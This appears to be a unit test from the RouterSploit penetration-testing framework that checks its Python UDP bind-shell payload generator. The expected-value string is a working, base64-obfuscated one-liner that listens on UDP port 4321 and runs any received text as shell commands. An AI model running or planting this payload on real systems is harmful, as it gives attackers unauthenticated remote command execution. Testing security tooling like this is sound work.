from routersploit.modules.payloads.cmd.python_bind_udp import Payload


# python bind udp payload with rport=4321
bind_udp = (
    "python -c \"exec('ZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBQb3BlbixQSVBFCmZyb20gc29ja2V0IGltcG9ydCBzb2NrZXQsIEFGX0lORVQsIFNPQ0tfREdSQU0Kcz1zb2NrZXQoQUZfSU5FVCxTT0NLX0RHUkFNKQpzLmJpbmQoKCcwLjAuMC4wJyw0MzIxKSkKd2hpbGUgMToKCWRhdGEsYWRkcj1zLnJlY3Zmcm9tKDEwMjQpCglvdXQ9UG9wZW4oZGF0YSxzaGVsbD1UcnVlLHN0ZG91dD1QSVBFLHN0ZGVycj1QSVBFKS5jb21tdW5pY2F0ZSgpCglzLnNlbmR0bygnJy5qb2luKFtvdXRbMF0sb3V0WzFdXSksYWRkcikK'.decode('base64'))\""
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.rport = 4321

    assert payload.run() == bind_udp
